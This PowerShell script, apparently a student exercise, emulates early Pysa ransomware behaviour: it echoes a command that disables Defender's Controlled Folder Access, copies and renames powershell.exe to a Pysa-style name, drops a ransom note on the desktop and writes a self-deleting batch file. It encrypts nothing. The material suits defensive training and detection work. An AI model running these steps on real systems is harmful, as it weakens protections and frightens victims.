<# 
    Storyline: This script disables Controlled Folder Access,
    and copies the powershell executable to the home dir
    and renames it to match with the pysa ransomware.
    It then creates a randsom demand file named Readme.READ and puts it on the users desktop
    Finally, creates an update.bat which will be used for 
    self deleting in step2.ps1
#>

# Disable Controlled Folder Access
# I have this command echoed because I do not want to run it on my own machine
echo "Set-MpPreference -EnableControlledFolderAccess Disabled"


# Copy powershell.exe to home dir
$file = "C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe"
$dir = "C:\Users\blais\SYS320\SYS320-SP22\"
Copy-Item $file -Destination $dir

# Random file name creation
$rand = Get-Random -Minimum 1000 -Maximum 9876
$pysa = "EnNoB-" + $rand + ".exe"

# Variable used to check if the file exists
$newFile = $dir + $pysa

# Rename the powershell.exe file based on the threat intell report
$location = $dir + "powershell.exe"
Rename-Item -Path $location -NewName $pysa

# Check that the copied file exists.
if ( Test-Path $newFile) {
    
    write-host -backgroundcolor "Green" -foregroundcolor "Black" "Pysa file was created!"

} else {

    write-host -backgroundcolor "Red" -foregroundcolor "Black" "Pysa file was not created!"

}

<# 
    Create a randsom demand file named Readme.READ and puts it on the users desktop
#>

# Ransom message
$msg = "If you want your files restored, please contact me at blaise.notter@mymail.champlain.edu. I look forward to doing business with you ;-)"

# Create the Readme file
$readme = "C:\Users\blais\Desktop\Readme.READ"

# Add the file to user's desktop
echo $msg | Out-File -FilePath $readme

# Check that the readme file exists.
if ( Test-Path $readme) {
    
    write-host -backgroundcolor "Green" -foregroundcolor "Black" "Readme file was created!"

} else {

    write-host -backgroundcolor "Red" -foregroundcolor "Black" "Readme file was not created!"
}

# Create an update.bat file that will delete step2.ps1
$writeUpdate = @'
del C:\Windows\Temp\step2.ps1
'@

# write to the file
$writeUpdate | Out-File -File ".\update.bat"

